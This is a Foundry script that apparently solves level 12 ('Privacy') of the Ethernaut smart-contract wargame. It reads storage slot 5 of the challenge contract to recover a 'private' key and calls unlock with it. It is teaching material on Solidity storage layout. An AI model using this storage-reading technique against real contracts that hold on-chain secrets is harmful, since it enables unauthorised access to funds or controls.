// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here

contract PrivacySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x131c3249e115491E83De375171767Af07906eA36;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE

        /**
         * Understanding Solidity’s Storage Layout And How To Access State Variables In Storage Slots.
         */
        bytes32 key = vm.load(challengeInstance, bytes32(uint256(5)));
        challengeInstance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(key)));


        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(12));
    }
}
